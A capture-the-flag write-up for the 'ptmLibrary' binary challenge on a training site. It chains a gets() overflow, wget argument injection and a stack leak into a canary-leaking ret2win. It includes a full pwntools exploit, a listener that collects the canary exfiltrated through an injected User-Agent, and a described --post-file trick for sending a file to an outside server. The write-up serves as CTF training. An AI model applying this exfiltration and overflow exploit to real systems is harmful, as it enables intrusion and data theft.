This is a write-up for the [ptmLibrary challenge](https://training.olicyber.it/challenges#challenge-608) on training.olicyber.it.
![Placeholder Text](https://5alv1.github.io/CTFs-writeups/assets/ptm_lib/challenge_presentation.png)
Let's first have a look at what security measures were taken:
![Placeholder Text](https://5alv1.github.io/CTFs-writeups/assets/ptm_lib/checksec.png)
Then, here's a breakdown of the challenge itself. At first there's a menu with five options:
![Placeholder Text](https://5alv1.github.io/CTFs-writeups/assets/ptm_lib/menu.png)
The first option opens up a series of unavailable options.
![Placeholder Text](https://5alv1.github.io/CTFs-writeups/assets/ptm_lib/invalid_first.png)
It's worth to note that the variable that controls the option you select is uninitialised (This will be useful later).
![Placeholder Text](https://5alv1.github.io/CTFs-writeups/assets/ptm_lib/uninit.png)
The second options lets you download a raw webpage given an url, the path in which is download is under `tmp` and it's a random named file.
![Placeholder Text](https://5alv1.github.io/CTFs-writeups/assets/ptm_lib/downloadPage.png)
It's fairly easy to see that the function calls the syscall `execvp` to call wget
![Placeholder Text](https://5alv1.github.io/CTFs-writeups/assets/ptm_lib/execvp.png)
This function is obviously vulnerable, the `gets` function should **never be used** (believe it or not, it's written [in the actual docs](https://www.man7.org/linux/man-pages/man3/gets.3.html)) because it does not offer an option to reduce the buffer size, and it reads all possible bytes, stopping only at a new line or an EOF. The only advantage (from a developer's point of view) is that it always puts a `NULL` byte after the data it writes, so it cannot be used for any kind of leaking (you should still **NOT** use it, though).

Now I have found a buffer overflow. Since the addresses are not randomised, I should be able to call the conveniently declared `printFlag` function (which just pops a shell), but I still need a way to find the canary value.

### What about the other functionalities in the program?
I'm gonna skip to the first menu's fourth option, since the third one isn't very interesting; this makes you input your name and puts it into a global array of characters:
![Placeholder Text](https://5alv1.github.io/CTFs-writeups/assets/ptm_lib/fgets.png)
![Placeholder Text](https://5alv1.github.io/CTFs-writeups/assets/ptm_lib/name_glob.png)
Now why exactly is this interesting? Because there's a string with a known address which we can control!

### My first approach
At first, I had in mind a really simple solution, since I can inject an argument into `execvp`, why can't I just put `--post-file=flag.txt` as an argument, and listen with a server of my own? This would have worked in theory, and in fact it does work in local. There's just a little problem:
```sh
#!/bin/bash

FLAG_SECRET=$(head /dev/urandom | LC_ALL=C tr -dc A-Za-z0-9 | head -c 40)

mv /home/pwn/flag.txt /home/pwn/flag_$FLAG_SECRET.txt

chmod 440 /home/pwn/flag_$FLAG_SECRET.txt && chmod 550 /home/pwn/chall && chown root:pwn /home/pwn/flag_$FLAG_SECRET.txt

socat -T60 "TCP-LISTEN:4444,reuseaddr,fork,su=pwn" "EXEC:/home/pwn/chall,pty,raw,stderr,echo=0"
```
# **FUCK**

### The illumination
Exploring the help page of `wget` I got to an interesting point:

```
-U,  --user-agent=AGENT          identify as AGENT instead of Wget/VERSION
```
This potentially gives me an arbitrary read, which I could use to read out the canary, but how do I know where the canary is? The function `scanf` comes in out help here, because when it's trying to read an integer (or any sort of numeric value) it will completely leave the memory alone if you write character that are not digits (I personally always use `-`), I'm not sure if it's some kind of bug, but here's proof of what I'm saying:
![[Pasted image 20241223021600.png]]
Sweet! Now let's see if this is an address of some kind, or the canary itself!
![[Pasted image 20241223021758.png]]
Sweet! Since the stack is static, with a leak I can always calculate the address of a canary, and leak it with the arbitrary read I found earlier!

### The exploit's structure
So basically I need a server running and saving the canary, I used `pwntools` to craft one real fast:
```python
from pwn import *

s = server(8080)


while True:
	conn = s.next_connection()
	conn.recvuntil('User-Agent: ', drop=True)
	
	canary = b"\x00" + conn.recv(7)
	conn.close()
	
	
	canary_file = open("canary", "wb")
	canary_file.write(canary)
	canary_file.close()
```
I also used `ngrok` in order to make it public without opening any of my router's ports.

Note that In the remote machine, due to different setup, using the first option immediately and giving `-` as input will NOT give you a leak, so in the exploit we will use option 4 to input `-U`, we will then get the stack address leak and calculate a canary's address. After that we will just do a `ret2win` in the `downloadPage` function.
The final exploit looks like this:
```python
from pwn import *

  

context.endianness = "little"
context.arch = "amd64"

i = open("input.txt", "wb")
elf = ELF("./chall")

if args.REMOTE:
	p = remote("ptmlibrary.challs.olicyber.it", 21011)
else:
	p = elf.process()

  

def buy_or_sell(p: process, opt="-"):
	p.sendlineafter(b"> ", b"1")
	p.sendlineafter(b"> ", opt.encode())
	
	p.recvuntil(b"Action ")
	
	leak = int(p.recvuntil(b" ")[:-1].decode())
	p.sendlineafter(b"> ", b"5")
	
	return leak

def update_info(p: process, name: str):
	p.sendline(b"4")
	p.sendlineafter(b"records: ", name.encode() + b"\x00")
  

def print_document(p: process, url: bytes):
	p.sendline(b"2")
	p.sendlineafter(b"URL: ", url)
  

update_info(p, "-U")
leak = buy_or_sell(p)

print(hex(leak))
canary_address = leak - 0x7f  

url = str(input("INSERT YOUR URL: "))

payload = url.encode() + b"\x00"*(170-len(url)) + p64(elf.symbols["name"]) + p64(canary_address) + p64(0)

print_document(p, payload)

input()
print(p.clean())

canary_file = open("canary", "rb")
canary = canary_file.read()

print(hex(u64(canary)))

payload = url.encode() + b"\x00"*(194-len(url)) + canary + p64(leak) + p64(elf.symbols["printFlag"] + 5)

# p.interactive()

print_document(p, payload)
p.interactive()
```

There are a few strange things, like adding 5 to a function's address, that's to avoid a segmentation fault due to bad content in `rbp`.

```
ptm{now_***********************_3ff3c7!}
```
